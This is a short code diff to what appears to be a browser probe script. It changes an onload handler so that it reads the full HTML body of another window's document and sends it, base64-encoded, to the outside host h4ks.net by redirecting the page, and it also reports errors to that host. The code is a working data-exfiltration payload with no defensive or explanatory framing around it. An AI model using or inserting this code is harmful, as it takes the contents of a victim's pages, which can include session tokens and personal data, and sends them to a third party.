@@ -3,7 +3,7 @@ try {
     x.onload = function () {
         try {
             var html = x.document.body.outerHTML;
-            location = '//h4ks.net/go/test?'+encodeURIComponent(html.length);
+            location = '//h4ks.net/go/test?'+btoa(encodeURIComponent(html));
         } catch (err) {
             location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
         }
